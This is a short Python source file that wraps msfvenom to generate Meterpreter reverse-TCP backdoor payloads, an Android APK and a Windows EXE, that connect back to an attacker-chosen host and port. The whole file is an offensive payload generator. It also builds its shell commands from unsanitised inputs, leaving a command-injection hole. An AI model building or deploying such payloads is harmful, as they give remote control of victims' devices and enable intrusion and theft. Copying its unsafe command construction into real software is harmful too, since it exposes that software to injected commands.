import subprocess

def generate_android(lhost, lport):
    try:
        output = "android_payload.apk"
        cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output}"
        return subprocess.getoutput(cmd)
    except Exception as e:
        return f"[ERROR] {e}"

def generate_windows(lhost, lport):
    try:
        output = "windows_payload.exe"
        cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}"
        return subprocess.getoutput(cmd)
    except Exception as e:
        return f"[ERROR] {e}"
